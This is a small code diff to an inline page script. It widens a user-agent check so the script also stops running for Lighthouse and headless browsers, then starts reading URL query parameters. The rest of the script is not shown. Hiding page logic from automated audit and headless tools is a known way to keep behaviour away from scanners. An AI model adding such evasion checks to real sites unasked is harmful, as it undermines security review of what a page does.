@@ -14,7 +14,7 @@
   <script>
     (function() {
       try {
-        var isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent);
+        var isBot = /bot|googlebot|crawler|spider|robot|crawling|lighthouse|headless/i.test(navigator.userAgent);
         if (isBot) return;
         var search = window.location.search;
         var p = new URLSearchParams(search);
